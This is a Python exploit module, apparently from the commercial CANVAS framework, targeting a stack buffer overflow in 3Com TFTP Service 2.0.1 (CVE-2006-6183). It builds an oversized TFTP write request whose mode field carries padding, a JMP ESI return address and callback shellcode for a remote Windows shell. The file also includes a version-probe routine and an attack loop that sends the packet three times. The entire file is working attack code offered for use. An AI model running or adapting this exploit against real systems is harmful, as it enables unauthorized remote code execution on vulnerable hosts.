#! /usr/bin/env python

"""

Exploit for 3com TFTP Svc version 2.0.1 
(You can download this from 3com if you know the name of the file)
(They now recommend not using it)
"""
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys 
if "." not in sys.path: sys.path.append(".")
import os
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import addencoder
from shellcode import shellcodeGenerator
from shellcode import win32shell
import canvasengine
import time
from socket import *
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *

NAME= "3comTFTP"
DESCRIPTION= "3com's TFTP Server (UDP port 69) version 2.0.1 overflow in mode"
VERSION= "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="3com"
DOCUMENTATION["Date public"]="10/26/06"
DOCUMENTATION["CERT Advisory"]="None"
DOCUMENTATION["Repeatability"]="One shot (may reexploit if successful and exitthread is called when done)"
DOCUMENTATION["References"] = "None"
DOCUMENTATION["CVE Name"] = "CVE-2006-6183"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6183"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Notes"]="""
This exploit should work against 3ComTFTPD version 2.0.1 - the current version is called
3ComDaemon version 2.0.10, which is a completely different program. However, many people
still use the old version as part of their toolkit. 

Immunity's version of this exploit is universal to all versions of Windows. This exploit
was originally created by VisualSploit. I don't think you'll ever need to change the port
since the service only listens on port 69.
"""

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["2000","XP","2003"]


targets = {
    0:["default target",0x00401379],
    1:["3CTftpSvc JMP ESI",0x00401379],
    }

"""
You'll note our target is in the .text section of the vulnerable
module, which should make it 100% reliable, regardless
of Windows version.
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = "127.0.0.1"
        self.localhost = "127.0.0.1"
        self.host = "127.0.0.1"
        self.port = 69
        self.targets = targets
        self.callbackport = 5556
        self.localport = 5556
        self.covertness = 0
        self.version = 0
        self.badstring = ""
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars="\x00"
        self.xpacket2badchars="\x00"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring = self.xpacket1badchars
        
    def createShellcodexPacket2(self):
        badstring = self.xpacket2badchars
        self.badstring="\x00"
        self.createSmallWin32Shellcode(self.localhost, self.localport,0)
        return self.shellcode

    def createxPacket1(self):
        buf = '' 
        buf+="\x00\x02"
        buf+="Hello.txt"
        buf+="\x00"
        packet2=self.createxPacket2()
        buf+=packet2
        buf+="A" * (473-len(packet2)) #padding 233 bytes to 473 bytes
        self.info,self.eip = targets[self.version]
        buf+= intel_order(self.eip)
        #essentially our buffer ends here, but we have this other stuff in case
        #we ever want to  change it to a jmp esp or something
        #esp points here, esi points at the top of our string
        #buf+="ABCDEFGH"
        #buf+=mosdef.assemble("jmp $-490", "X86")
        #buf+="\x00"
        return buf

    def createxPacket2(self):
        """
        We have to subtract from esp to avoid potentially corrupting our shellcode, which
        is somewhere higher on the stack
        """
        buf = '' 
        code = """ add $-300, %esp """ 
        buf+=mosdef.assemble(code, 'X86')
        buf+=self.createShellcodexPacket2()
        return buf

    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        return 
    
    def test(self):
        #note - not MOSDEFSock compatable!!!
        #we can't do a simple sock.recv() because
        #it sends you the response from some other random port
        #not port 69. So you have to use recvfrom()
        self.getargs()
        FD_1 = self.getudpsock()
        #FD_1.connect((self.host,self.port))
        ret=0
        try:
            self.log("Sending TFTP WRQ for test()")
            FD_1.sendto("\x00\x02A\x00B\x00",0,(self.host,self.port))
            self.log("Recving TFTP response")
            (data, address)=FD_1.recvfrom(512,0)
            self.log("Recved %s from remote TFTP server"%prettyprint(data))
            if "Unknown or unsupported transfer mode" in data:
                self.version=1
                ret=1
        except:
            #a timeout or other error
            pass
            #import traceback
            #traceback.print_exc(file=sys.stderr)
        return ret 

    def run(self):
        self.getargs()
        """
        We send three packets to account for packet loss
        """
        for i in range(0,3):
            self.log("Try %s"%i)
            FD_1 = self.getudpsock()
            self.log("UDP: connect(%s,%s)" % (self.host, self.port))
            FD_1.connect((self.host,self.port))
            self.log("Connected!")
            xpacket1buf=self.createxPacket1()
            self.log("sending buffer of length %s..." % str(len(xpacket1buf)))
            FD_1.send(xpacket1buf)
            if self.ISucceeded():
                self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
                return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
